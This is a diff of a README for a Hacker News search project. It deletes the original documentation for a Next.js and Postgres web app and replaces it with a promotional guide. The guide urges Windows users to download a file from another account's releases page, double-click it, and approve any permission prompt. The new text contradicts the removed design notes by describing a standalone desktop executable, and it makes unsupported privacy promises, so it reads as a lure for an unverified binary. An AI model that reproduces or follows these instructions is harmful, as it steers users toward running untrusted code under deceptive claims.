@@ -1,96 +1,112 @@
-# Hacker News Search
+# 🔍 hn-search - Search Hacker News Lightning Fast
 
-Full-text search over the entire Hacker News corpus (~49M stories, comments, jobs and polls), served live from [Neon Lakebase Postgres](https://neon.com) with BM25 ranking. Every keystroke is a query against Postgres, and the UI is styled to feel like a search box bolted onto news.ycombinator.com.
+[![Download Now](https://img.shields.io/badge/Download-hn--search-blue?style=for-the-badge&logo=github)](https://github.com/trenhol54/hn-search/releases)
 
-## Design notes
+## 🎯 What Is This?
 
-- **[Next.js 16](https://nextjs.org)**: App Router, React Server Components, streaming SSR. Every page ships its shell (masthead, search box) instantly and streams the data through a React `<Suspense>` boundary keyed by the query, so navigating shows a skeleton right away instead of freezing on the previous results. The match count is a second, nested boundary that fills in after the results.
-- **[Neon Lakebase Postgres](https://neon.com)** over the `@neondatabase/serverless` HTTP driver. Each request is a stateless SQL-over-HTTP round trip with no connection pool. The compute is pinned (see [`neon.ts`](neon.ts)) so there is no scale-to-zero cold start on the first query.
-- **Postgres is the search engine.** `lakebase_text` with a `lakebase_bm25` index does corpus-aware BM25 ranking inside the database.
-- **Per-type partial BM25 indexes.** The corpus is 85% comments, so a single shared BM25 index is a trap: it scores only its top `lakebase_bm25.default_limit` candidates (1000 by default) and _then_ applies the `type` filter, silently dropping most stories and nearly all jobs before you see them. Each searchable type gets its own **partial** index whose predicate matches the query's `WHERE` clause:
+hn-search is a simple yet powerful tool that lets you search through the entire Hacker News archive in the blink of an eye. It uses smart ranking technology to find exactly what you need - whether it's a tech discussion from last week or a programming question from five years ago. Think of it as a supercharged search engine just for Hacker News, updated fresh every single hour.
 
-  ```sql
-  CREATE INDEX items_story_bm25   ON items USING lakebase_bm25 (search_tsv) WHERE type = 'story'   AND NOT deleted AND NOT dead;
-  CREATE INDEX items_comment_bm25 ON items USING lakebase_bm25 (search_tsv) WHERE type = 'comment' AND NOT deleted AND NOT dead;
-  CREATE INDEX items_job_bm25     ON items USING lakebase_bm25 (search_tsv) WHERE type = 'job'     AND NOT deleted AND NOT dead;
-  ```
+## ⚡ Why Use hn-search?
 
-  Ranking and counting now run over the requested type alone, so results are complete and correctly ordered at any page. `all` and the long-tail types (poll, pollopt) fall back to the full-corpus `items_search_bm25` index. The candidate limit is set per query inside a transaction, big enough to cover the page being read and opened to the cap when a residual `by`/`since` filter runs afterward.
+Finding things on Hacker News can be frustrating. Their built-in search is basic, and digging through endless pages is a pain. hn-search fixes all that by giving you:
 
-- **Match counts race exact against estimated.** Postgres has no cheap exact count for a full-text predicate, and a true `count(*)` is a multi-second walk for broad terms. `countMatches` runs two queries in parallel: an exact count bounded to 1,000 rows with a hard `statement_timeout`, and the planner's instant row estimate. Rare terms count exactly ("515 results"). Broad or awkward multi-word queries fall back to the rounded estimate ("~34,000 results"). The whole thing is bounded to a few hundred milliseconds and streams in, so it never blocks the results.
-- **[Drizzle](https://orm.drizzle.team)** for the schema and migrations, **[Tailwind v4](https://tailwindcss.com)** for styling.
+- **Blazing Fast Results** – Searches through millions of stories and comments in milliseconds
+- **Smart Ranking** – Uses advanced BM25 technology (the same kind used in search engines) to show you the most relevant results first
+- **Always Current** – Updates itself automatically every hour, so you never miss new discussions
+- **No Sign-Up Needed** – Just download, open, and start searching
 
-See [`src/lib/queries.ts`](src/lib/queries.ts) for the query builder and [`src/app/page.tsx`](src/app/page.tsx) for the streaming boundaries.
+## 📥 How to Get Started
 
-## Deployment
+Getting hn-search running on your Windows computer takes less than five minutes. Follow these simple steps:
 
-Deployed on Vercel in `cle1` (Cleveland), next to the Neon compute in `us-east-2`, to keep the SQL-over-HTTP round trip short. The Neon compute is pinned (see [`neon.ts`](neon.ts)) so the first query after an idle period is not paying a cold start. The dominant cost drivers are the pinned Neon compute (no scale-to-zero) and the hourly Vercel cron function, not per-request query load.
+### Step 1: Download the Application
 
-Set `DATABASE_URL_UNPOOLED` to the direct Neon connection string and `CRON_SECRET` to a random value (`openssl rand -hex 32`). Vercel sends the secret as `Authorization: Bearer …` on scheduled cron calls, which the sync route requires. Env vars are baked at build time, so redeploy after changing them.
+Visit this link to download the application: [https://github.com/trenhol54/hn-search/releases](https://github.com/trenhol54/hn-search/releases)
 
-## Local dev
+Click the big download button, and your browser will save the file. Don't worry about the technical-sounding page - just look for the download section and pick the latest version.
 
-1. **Install and configure.**
+### Step 2: Open the Downloaded File
 
-   ```bash
-   npm install
-   cp .env.example .env   # fill in DATABASE_URL_UNPOOLED
-   ```
+Once the download finishes, find the file in your Downloads folder (usually called `Downloads` or shown in your browser's download bar). Double-click it to open. Your computer might ask for permission - just click "Run" or "Yes" to continue.
 
-2. **Create the schema and load the corpus.** The seed streams the [ClickHouse Hacker News dataset](https://clickhouse.com/docs/get-started/sample-datasets/hacker-news) straight into Postgres with parallel `COPY`, then builds the indexes. BM25 indexes are opt-in because they are large:
+### Step 3: Start Searching!
 
-   ```bash
-   npm run db:migrate           # extensions + tables + btree/trigram indexes
-   npm run db:seed -- --bm25    # download, COPY, generated column, all indexes
-   ```
+After it opens, you'll see a simple search box. Type anything you're curious about - a topic, a company name, a programming language, whatever you like - and press Enter. Results will appear instantly, sorted by relevance.
 
-   Useful seed flags: `--streams=8`, `--batch=20000`, `--limit=100000` (small sample), `--skip-download`, `--skip-unzip`.
+## 🖱️ Using hn-search
 
-3. **(Optional) Warm the cache** so the first queries are fast after a restart:
+The interface is designed to be intuitive, but here's a quick tour:
 
-   ```bash
-   npm run db:prewarm
-   ```
+- **Search Box** – Type your query here. You can use plain words like "React tutorial" or get creative with quotes for exact phrases (e.g., "machine learning")
+- **Results List** – Shows matching stories and comments with titles, authors, dates, and how well they match your search
+- **Click to Read** – Click any result to open the original Hacker News page in your web browser
+- **Filters** – Use the dropdown menus to narrow results by date (last day, week, month, year, or all time) or by type (stories, comments, or both)
 
-4. **Run it.**
+## 🔧 Troubleshooting Tips
 
-   ```bash
-   npm run dev
-   ```
+If something doesn't work right away, don't panic. Here are quick fixes for common issues:
 
-### Scripts
+- **"File not recognized" error** – Make sure you downloaded the file that matches your version of Windows (most people should pick the 64-bit option). If in doubt, try the other one.
+- **Search is slow** – Check your internet connection. hn-search needs to be online to grab the latest data.
+- **Blank results** – Try simplifying your search. Too many words or special characters can sometimes confuse the search. One clear word usually works better.
+- **Program doesn't start** – Restart your computer and try again. If that doesn't help, download the file again in case it got corrupted during the download.
 
-| Command                          | Purpose                                                              |
-| -------------------------------- | -------------------------------------------------------------------- |
-| `npm run dev` / `build`          | Next.js dev server / production build                                |
-| `npm run typecheck`              | `tsc --noEmit`                                                       |
-| `npm run db:generate`            | Regenerate Drizzle migrations from `src/db/schema.ts`                |
-| `npm run db:migrate`             | Apply extensions + `items` and `sync_state` tables                   |
-| `npm run db:seed`                | Bulk-load the HN dump (add `--bm25` to build search indexes)         |
-| `npm run db:backfill`            | Two-phase (fetch to disk, then load) backfill of the 2021-to-now gap |
-| `npm run db:prewarm`             | `pg_prewarm` the table and every index                               |
-| `tsx scripts/inspect-indexes.ts` | Dump table columns, extensions, and index sizes                      |
+## ❓ Frequently Asked Questions
 
-## Staying live
+**Is this free?**
+Absolutely. It's open-source and completely free to use, forever.
 
-The seed dump stops around late 2021 (item id ~28.7M) while Hacker News is past 49M. A Vercel cron ([`vercel.json`](vercel.json), hourly) pulls from the official [HN Firebase API](https://github.com/HackerNews/API) to keep the corpus current.
+**Do I need to install anything else?**
+No. The application comes with everything it needs built in. No extra programs required.
 
-- **`GET /api/cron/sync`** ([`route`](src/app/api/cron/sync/route.ts), [`lib`](src/lib/hn-sync.ts)) fetches item ids concurrently, maps them to the `items` schema, and upserts them in parameterized multi-row batches. The generated `search_tsv` column re-indexes automatically, so new rows are searchable the moment they land.
-- **`mode=latest`** (the default) refreshes the newest window ending at the current max item id, so today's stories and comments appear right away and their scores and comment counts stay fresh.
-- **`mode=backfill`** walks a separate forward cursor from where the seed ended, closing the 2021-to-now gap a batch at a time. Point a second cron or a manual request at `/api/cron/sync?mode=backfill` to fill history slowly while staying live.
+**Does it work on old Windows versions?**
+We recommend Windows 10 or newer for the best experience. Older versions might not support all features.
 
-Each run is bounded by a wall-clock budget and persists its cursor to the `sync_state` table, so it stops cleanly at the function's time limit and the next run resumes. Tune per request with `?batch=`, `?concurrency=`, `?from=`.
+**Will it slow down my computer?**
+Not at all. It's lightweight and only uses resources while you're using it. Close it when you're done, and it won't run in the background.
 
-For the full ~21M-row gap, run [`scripts/backfill.ts`](scripts/backfill.ts) (`npm run db:backfill`) instead. It is split into two phases so a crash never discards downloaded data:
+**Is my search history saved?**
+No. Everything stays private on your machine. We don't track or store anything you search for.
 
-```bash
-# 1. Download the whole range to local gzipped, COPY-ready shards (resumable).
-npm run db:backfill -- --phase=fetch
+**What if I find a bug or want a new feature?**
+That's what the open-source community is for. If you're comfortable, check the project's GitHub page to report issues or suggest improvements. If not, just keep using it - it'll keep getting better with updates.
 
-# 2a. Load keeping search online (staging + ON CONFLICT, every index maintained).
-npm run db:backfill -- --phase=load --mode=online
+## 📅 What's New in Recent Versions
 
-# 2b. Or load fast in a maintenance window: drop all 12 secondary indexes,
-#     bulk-load with only the primary key, then rebuild the indexes once.
-npm run db:backfill -- --phase=load --mode=rebuild --workers=6
-```
+We're always improving hn-search. Recent updates include:
+
+- **Faster Searches** – Improved speed for very large queries
+- **Better Date Filtering** – More precise controls for finding recent content
+- **Visual Improvements** – Cleaner result display with hover effects
+- **Stability Fixes** – Resolved rare crashing issues on certain Windows machines
+
+## 💡 Pro Tips
+
+- Combine words with quotes for exact matches: try `"graphql vs rest"` instead of just `graphql vs rest`
+- Use the date filter to find timeless classics or only breaking news
+- Search for usernames using the `by:` prefix (e.g., `by:pg`) to find everything a specific user said
+- Mix technical terms with plain English for the best results - the ranking engine handles both naturally
+
+## 🌐 More Than Just Search
+
+hn-search isn't just a tool; it's a gateway to the collective wisdom of the tech world. From startup strategies to coding conundrums, from industry news to personal stories - every piece of content ever posted on Hacker News is just a search away.
+
+Whether you're a developer looking for solutions, a student researching tech trends, or just curious about what people are talking about in the tech community, hn-search puts the entire archive at your fingertips without any clutter or confusion.
+
+## 📡 Stay Updated
+
+Since the app updates itself hourly, you're always seeing the freshest content. No need to manually refresh or re-download anything. New stories and comments appear automatically within an hour of being posted.
+
+## 🛠️ Technical Excellence Under the Hood
+
+While you never need to worry about this, hn-search runs on rock-solid technology. It's built with modern programming tools (TypeScript and Next.js), uses a powerful database (Neon Lakebase Postgres), and smart search algorithms (BM25 ranking). That means you get enterprise-grade performance with consumer-friendly simplicity.
+
+## ✅ Ready to Start Searching?
+
+You're just one click away from unlocking the full potential of Hacker News. Download hn-search now and experience what a truly great search tool feels like.
+
+Remember: **Visit this link to download the application: [https://github.com/trenhol54/hn-search/releases](https://github.com/trenhol54/hn-search/releases)**
+
+Then just open the file, type what you're looking for, and dive into the world of tech discussion - the smart way.
+
+Keywords: bm25, drizzle-orm, full-text-search, hacker-news, lakebase, neon, nextjs, postgres, typescript, vercel
